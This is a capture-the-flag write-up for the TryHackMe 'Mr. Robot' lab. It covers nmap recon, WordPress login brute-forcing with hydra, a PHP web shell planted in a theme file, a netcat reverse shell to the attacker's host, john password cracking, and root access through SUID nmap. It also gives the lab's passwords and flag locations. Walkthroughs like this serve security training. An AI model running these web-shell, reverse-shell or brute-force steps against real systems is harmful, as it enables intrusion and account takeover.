# 🤖 TryHackMe: Mr. Robot

> **Difficulty:** Medium  
> **IP:** `10.10.X.X` (replace with actual THM IP)  
> **Tags:** `Web`, `Enumeration`, `WordPress`, `Privilege Escalation`

---

## 🧭 1. Recon

### 🔍 Nmap Scan

```bash
nmap -sC -sV -oN mrrobot.nmap 10.10.X.X
Result:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1
80/tcp open  http    Apache httpd
Apache is running on port 80. Let’s explore it in a browser.

🌐 2. Web Enumeration
The homepage resembles the Mr. Robot TV show site.

📄 Check robots.txt

curl http://10.10.X.X/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
fsocity.dic: A wordlist

key-1-of-3.txt: First flag

curl http://10.10.X.X/key-1-of-3.txt
✅ Found first flag!

🧰 3. Directory Brute Forcing
Use gobuster with the discovered wordlist:

gobuster dir -u http://10.10.X.X -w fsocity.dic -t 50
Discovered: /wp-login.php → WordPress login page

🔑 4. WordPress Login Brute-force
Use hydra or wpscan to brute-force the credentials:

hydra -l elliot -P fsocity.dic 10.10.X.X http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid"
✅ Credentials found:

Username: elliot

Password: ER28-0652

Login at: http://10.10.X.X/wp-login.php

🐚 5. Getting a Shell
Go to:
Appearance → Theme Editor → 404.php

Insert a PHP reverse shell:

<?php system($_GET['cmd']); ?>
Now trigger the shell:

curl "http://10.10.X.X/wp-content/themes/twentyfifteen/404.php?cmd=nc -e /bin/bash YOUR-IP 4444"
Start listener:

nc -lvnp 4444
✅ Got reverse shell as daemon user

⬆️ 6. Privilege Escalation
📁 Check for second flag
find / -name "key-2-of-3.txt" 2>/dev/null
Found inside robot user’s home but not accessible.

🔐 Switch to robot user
Try password reuse or crack using john:

john --wordlist=fsocity.dic password.raw
✅ Password cracked: abcdefghijklmnopqrstuvwxyz

su robot
✔️ Access granted
✔️ Second flag obtained

🏁 7. Root Access
🔍 Check for SUID binaries:

find / -perm -4000 2>/dev/null
Found: nmap with SUID permissions

🔓 Exploit using nmap interactive shell:

nmap --interactive
Inside interactive shell:

!sh
✅ Got root shell
✅ Found key-3-of-3.txt

🧠 Lessons Learned
robots.txt often leaks useful files

Custom wordlists can lead to login credentials

PHP reverse shell injection via theme editor is effective

Look for SUID binaries for easy privilege escalation

🏆 Flags
Flag	Status
key-1-of-3.txt	✅
key-2-of-3.txt	✅
key-3-of-3.txt	✅

---
